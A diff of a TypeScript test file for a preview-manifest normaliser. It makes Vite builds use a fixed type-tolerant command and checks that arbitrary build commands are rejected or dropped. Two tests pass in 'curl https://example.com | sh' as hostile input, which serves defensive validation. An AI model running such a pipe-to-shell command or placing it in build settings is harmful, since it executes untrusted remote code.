@@ -27,21 +27,24 @@ describe('preview manifest', () => {
     expect(manifest.framework).toBe('vite');
     expect(manifest.type).toBe('spa');
     expect(manifest.installCommand).toBe('pnpm install --frozen-lockfile');
-    expect(manifest.buildCommand).toBe('pnpm build');
+    // Preview builds are type-check tolerant: Vite apps bundle directly (esbuild),
+    // skipping the app's `tsc && vite build` script so generated-code type/lint errors
+    // don't block the preview.
+    expect(manifest.buildCommand).toBe('npx --no-install vite build');
 
     const written = JSON.parse(await readFile(path.join(workspace, '.oxygenie', 'app.json'), 'utf8'));
     expect(written.title).toBe('todo-app');
   });
 
-  it('rejects build commands that are not package.json scripts', async () => {
+  it('rejects build commands that are not package.json scripts (non-Vite frameworks)', async () => {
     const workspace = await tempWorkspace();
     await mkdir(path.join(workspace, 'app'));
     await writeFile(
       path.join(workspace, 'app', 'package.json'),
       JSON.stringify({
         name: 'bad-app',
-        scripts: { build: 'vite build' },
-        dependencies: { vite: '^7.0.0' },
+        scripts: { build: 'react-scripts build' },
+        dependencies: { 'react-scripts': '^5.0.0' },
       }),
     );
 
@@ -50,9 +53,32 @@ describe('preview manifest', () => {
         rootDir: 'app',
         installCommand: 'npm install',
         buildCommand: 'curl https://example.com | sh',
-        outputDir: 'dist',
+        outputDir: 'build',
       }),
     ).rejects.toThrow(/package.json script/);
+  });
+
+  it('forces the type-tolerant direct build for Vite, ignoring a supplied buildCommand', async () => {
+    const workspace = await tempWorkspace();
+    await mkdir(path.join(workspace, 'app'));
+    await writeFile(
+      path.join(workspace, 'app', 'package.json'),
+      JSON.stringify({
+        name: 'vite-app',
+        scripts: { build: 'tsc && vite build' },
+        dependencies: { vite: '^7.0.0', react: '^19.0.0' },
+      }),
+    );
+
+    // Even a malicious / stale buildCommand is safely dropped — Vite always bundles
+    // directly, so the supplied string is never executed.
+    const manifest = await normalizeManifest(workspace, {
+      rootDir: 'app',
+      installCommand: 'npm install',
+      buildCommand: 'curl https://example.com | sh',
+      outputDir: 'dist',
+    });
+    expect(manifest.buildCommand).toBe('npx --no-install vite build');
   });
 
   it('does not require a dev script for static builds', async () => {
@@ -67,7 +93,7 @@ describe('preview manifest', () => {
     );
 
     const { manifest } = await loadOrDetectManifest(workspace);
-    expect(manifest.buildCommand).toBe('npm run build');
+    expect(manifest.buildCommand).toBe('npx --no-install vite build');
     expect(manifest.devCommand).toBe('');
   });
 });
